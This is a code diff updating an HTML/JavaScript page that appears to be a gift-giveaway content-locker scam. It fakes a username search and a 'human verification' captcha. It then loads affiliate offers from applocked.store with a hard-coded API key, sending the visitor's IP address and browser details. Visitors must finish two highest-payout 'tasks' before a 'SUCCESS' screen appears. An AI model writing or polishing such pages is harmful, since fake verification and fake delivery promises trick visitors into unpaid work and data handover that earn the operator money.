+            playSfx('btn');
             const input = document.getElementById('username-input');
             const btn = document.getElementById('btn-proceed');
             const user = input.value.trim();
 
-            if (!user) return alert("Please enter a username.");
+            if (!user) {
+                input.style.borderColor = "red";
+                return;
+            }
 
             btn.disabled = true;
-            btn.innerText = "FETCHING USER...";
+            btn.innerText = "SEARCHING...";
+            btn.style.opacity = "0.7";
 
+            // Simulate API Search Delay
             setTimeout(() => {
                 userData.name = user;
                 updateUI();
@@ -262,17 +426,16 @@
             document.getElementById('confirm-name').innerText = userData.name;
             document.getElementById('confirm-avatar').src = userData.avatar;
 
+            // Transition
+            switchScreen('screen-login', 'screen-stand');
+            
+            // Reset Login Button
             setTimeout(() => {
-                document.getElementById('screen-login').classList.add('hidden');
-                document.getElementById('screen-stand').classList.remove('hidden');
-                resetBtn();
-            }, 500);
-        }
-
-        function resetBtn() {
-            const btn = document.getElementById('btn-proceed');
-            btn.disabled = false;
-            btn.innerText = "PROCEED";
+                const btn = document.getElementById('btn-proceed');
+                btn.disabled = false;
+                btn.innerText = "PROCEED";
+                btn.style.opacity = "1";
+            }, 1000);
         }
 
         function showConfirm(amount) {
@@ -291,28 +454,33 @@
         function closeModals() {
             document.getElementById('modal-confirm').classList.remove('active');
             document.getElementById('modal-captcha').classList.remove('active');
+            
+            // Reset modal state after animation
             setTimeout(() => {
                 document.getElementById('captcha-step-1').classList.remove('hidden');
                 document.getElementById('offer-step').classList.add('hidden');
                 document.getElementById('success-step').classList.add('hidden');
-                document.getElementById('captcha-header-text').innerText = "You're almost there";
+                document.getElementById('captcha-header-text').innerText = "HUMAN VERIFICATION";
             }, 300);
         }
 
         function executeLocker() {
             document.getElementById('captcha-step-1').classList.add('hidden');
             document.getElementById('offer-step').classList.remove('hidden');
-            document.getElementById('captcha-header-text').innerText = "Verification Required";
+            // Re-display flex because hidden removes it
+            document.getElementById('offer-step').classList.add('flex'); 
+            
+            document.getElementById('captcha-header-text').innerText = "COMPLETE TASKS";
             fetchOffers();
         }
 
-        // --- UPDATED OGADS OFFER LOAD FUNCTION ---
+        // --- OFFERS LOGIC ---
         function fetchOffers() {
             const apiKey = "38083|fqRt4E7BOs6reipIQVm21WNEvXnbNMNihYOgewUq8f871a6f";
             const endpoint = "https://applocked.store/api/v2";
             
-            $("#loading-offers").show();
-            $("#offers-list").hide();
+            $("#loading-offers").removeClass('hidden');
+            $("#offers-list").empty();
             
             $.getJSON("https://api.ipify.org?format=json", function(ipData) {
                 const apiURL = `${endpoint}?ip=${ipData.ip}&user_agent=${encodeURIComponent(navigator.userAgent)}&max=30&ctype=3`;
@@ -323,44 +491,39 @@
                     method: "GET",
                     dataType: "json",
                     success: function(data) {
-                        $("#loading-offers").hide();
-                        $("#offers-list").show().empty();
+                        $("#loading-offers").addClass('hidden');
 
                         if (data.offers && data.offers.length > 0) {
-                            // Sort by highest payout
                             let sorted = data.offers.sort((a, b) => parseFloat(b.payout) - parseFloat(a.payout));
                             
                             $.each(sorted.slice(0, 5), function(i, o) {
-                                // Logic for Hot Sticker on Top 2
-                                let sticker = (i < 2) ? '<div class="hot-sticker">Hot</div>' : '';
-                                
-                                // Append unique tracking ID to the link for postback
+                                let sticker = (i < 2) ? '<div class="hot-sticker">🔥 HOT</div>' : '';
                                 let link = o.link + (o.link.includes('?') ? '&' : '?') + `aff_sub5=${uniqueTrackingId}`;
                                 
                                 let html = `
-                                    <div class="offer-card" onclick="openOffer('${link}', this)">
+                                    <div class="offer-card" onclick="openOffer('${link}', this); playSfx('click')">
                                         ${sticker}
-                                        <h4>${o.name}</h4>
-                                        <p>Complete this this task to verify your gift delivery.</p>
-                                        <div class="offer-btn">START TASK</div>
+                                        <h4 class="font-bold text-gray-800 text-sm pr-6">${o.name}</h4>
+                                        <p class="text-xs text-gray-500 mt-1 leading-tight">Complete to verify.</p>
+                                        <div class="offer-btn mt-2 bg-[#e91e63] text-white text-[10px] font-bold text-center py-2 rounded uppercase tracking-wider">START TASK</div>
                                     </div>
                                 `;
                                 $("#offers-list").append(html);
                             });
                         } else {
-                            $("#offers-list").html('<p class="text-xs text-center text-gray-400">No tasks currently available. Refresh in a moment.</p>');
+                            $("#offers-list").html('<p class="text-xs text-center text-gray-400 mt-4">No tasks currently available.</p>');
                         }
                     },
                     error: function() {
-                        $("#loading-offers").hide();
-                        $("#offers-list").show().html('<p class="text-xs text-center text-red-400">Connection error. Check your internet.</p>');
+                        $("#loading-offers").addClass('hidden');
+                        $("#offers-list").html('<p class="text-xs text-center text-red-400 mt-4">Connection error.</p>');
                     }
                 });
             });
         }
 
         function openOffer(url, el) {
-            $(el).find('.offer-btn').text('Checking Status...').css('background', '#666');
+            $(el).find('.offer-btn').text('Checking...').css('background', '#9ca3af');
             window.open(url, '_blank');
 
             const checkInterval = setInterval(() => {
@@ -376,6 +539,7 @@
         }
 
         function updateProgress(el) {
+            playSfx('btn'); // Sound on success
             completedOffers++;
             document.getElementById('comp-count').innerText = completedOffers;
             let percent = (completedOffers / 2) * 100;
@@ -386,15 +550,12 @@
             if (completedOffers >= 2) {
                 setTimeout(() => {
                     document.getElementById('offer-step').classList.add('hidden');
+                    document.getElementById('offer-step').classList.remove('flex');
                     document.getElementById('success-step').classList.remove('hidden');
-                    document.getElementById('captcha-header-text').innerText = "Confirmed!";
+                    document.getElementById('captcha-header-text').innerText = "SUCCESS";
                 }, 800);
             }
         }
     </script>
 </body>
 </html>
-
-
-
-
